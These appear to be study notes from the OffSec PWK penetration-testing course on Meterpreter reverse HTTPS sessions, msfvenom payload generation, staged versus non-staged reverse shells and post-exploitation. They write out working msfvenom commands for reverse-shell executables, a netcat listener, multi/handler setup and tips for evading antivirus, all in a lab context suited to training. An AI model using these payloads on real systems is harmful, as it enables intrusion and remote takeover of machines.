### HTTP Meterpreter Payload

- **Sending Linux/x64/Meterpreter Reverse HTTPS Command:**
  - Target: `http://192.168.50.16:80`
  - Handling request from: `192.168.50.16` (UUID: `qtj6ydxw`)
  - Redirecting stageless connection with User-Agent: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69`

- **Establishing Meterpreter Session:**
  - New session opened: `https://192.168.119.4:4444 -> 127.0.0.1` at `2022-08-08 06:12:42 -0400`
  - Note: Manual cleanup of `/tmp/IkXnnbYT` on the target may be required.

### Meterpreter HTTPS Non-Staged Payload

- **Listing 661** demonstrates the establishment of a Meterpreter session through various requests.
- **Defender Perspective:** The payload's communication appears as regular HTTPS traffic. Accessing the endpoint (`our Kali machine`) via a browser returns a "Not Found" page with an HTTP code `404`.
- **Penetration Testing Strategy:** Use this payload to bypass security measures. However, due to high detection rates by antivirus solutions, it is advisable to first establish a raw TCP shell and then deploy a Meterpreter shell once security technologies are disabled or bypassed.

### Summary

- **Meterpreter Overview:**
  - Metasploit’s signature payload with many features.
  - Discussed basic commands, channels, and the difference between raw TCP and HTTPS payloads.

### Executable Payloads with msfvenom

- **msfvenom Usage:**
  - Generates payloads in various file types and formats.
  - Example: Creating a malicious Windows binary for a raw TCP reverse shell.
  - Command: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe`
  - Output: `nonstaged.exe` (460 bytes payload, 7168 bytes final size)

- **Execution:**
  - Start Netcat listener on port 443.
  - Connect to the target via RDP and download/execute `nonstaged.exe`.
  - Result: Incoming reverse shell on Netcat listener.

### Staged vs. Non-Staged Payloads

- **Staged Payload:**
  - Created using: `msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe`
  - Requires Metasploit’s `multi/handler` module to handle the incoming connection.
  - Command: `use multi/handler`, set `payload => windows/x64/shell/reverse_tcp`, `LHOST => 192.168.119.2`, `LPORT => 443`, and run.
  - Result: Interactive reverse shell in the context of a session.

- **Non-Staged Payload:**
  - Can be handled by tools like Netcat.
  - Example: `nc -nvlp 443` to listen for incoming connections.

### Using msfvenom in Penetration Tests

- **Executable File Types:**
  - PowerShell scripts, Windows executables, Linux executables.
- **Web Shells:**
  - Exploit web application vulnerabilities.
- **Client-Side Attacks:**
  - Generate files for client-side attacks.

### Post-Exploitation with Metasploit

- **Learning Objectives:**
  - Use core Meterpreter post-exploitation features.
  - Use post-exploitation modules.
  - Perform pivoting with Metasploit.

- **Core Meterpreter Features:**
  - Navigate the file system.
  - Obtain information about the target system.
  - Transfer files to and from the machine.
  - Note: Fewer features available for Linux compared to Windows.

- **Example:**
  - Create a Windows executable with a Meterpreter reverse HTTPS payload.
  - Command: `msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.4 LPORT=443 -f exe -o met.exe`
  - Set up `multi/handler` in Metasploit.
  - Serve the executable via a Python3 web server.
  - Download and execute `met.exe` on the target.
  - Result: New Meterpreter session established.

### Conclusion

- **Summary:**
  - Covered the use of Meterpreter and msfvenom for generating and handling payloads.
  - Explored post-exploitation features and modules in Metasploit.
  - Demonstrated the process of creating and executing executable payloads and managing sessions.

---

**PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.**  
**Made in Morocco**  
**Penetration Testing with Kali Linux**